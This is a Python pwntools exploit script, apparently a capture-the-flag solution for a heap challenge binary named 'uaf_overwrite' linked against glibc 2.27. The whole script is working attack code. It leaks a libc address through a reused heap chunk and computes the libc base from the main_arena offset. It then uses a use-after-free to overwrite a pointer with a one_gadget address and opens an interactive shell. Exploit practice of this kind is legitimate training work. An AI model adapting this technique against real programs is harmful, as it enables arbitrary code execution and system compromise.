#!/usr/bin/env python3

from pwn import *

exe = ELF("./uaf_overwrite_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe
p = process()
#gdb.attach(p,gdbscript='''
#           b*custom_func+126
 #          b*custom_func+219
 #          b*custom_func+376
#           ''')
def custom_func(data,size,idx) :
    p.sendlineafter(b'> ',b'3')
    p.sendlineafter(b'Size: ',str(size))
    p.sendafter(b'Data: ',data.encode())
    p.sendlineafter(b'idx: ',str(idx).encode())
def robot_func():
    p.sendlineafter(b'> ',b'2')
    p.sendlineafter(b'Weight: ',str(100))
def human_func(age):
    p.sendlineafter(b'> ',b'1')
    p.sendlineafter(b'Weight: ',str(100))
    p.sendlineafter(b'Age: ',str(age))
input()
custom_func("aaaa",1500,-1)
custom_func("bbbb",1500,0)

p.sendlineafter(b'> ',b'3')
p.sendlineafter(b'Size: ',b'1500')
p.sendafter(b'Data: ',b'a')
p.recvuntil(b'Data: ')
leak = u64(p.recv(6).ljust(8,b'\x00'))
print("leak libc: ",hex(leak))
p.sendlineafter(b'idx: ',b'-1')

#find area offset
#area_offset = libc.sym.__malloc_hook + 0x10
offset_main_area = 0x3ebc40

bytes_of_area = offset_main_area & 0xff
bytes_of_leak = leak & 0xff

libc.address = leak - offset_main_area + (bytes_of_area - bytes_of_leak)
print("libc address: ",hex(libc.address))

one_gadget = [0x4f3ce,0x4f3d5,0x4f432,0x10a41c]
getshell = libc.address + one_gadget[3]


# luc nay tan dung use_after_free de ghi de one_gadget 
human_func(getshell)
robot_func()



p.interactive()
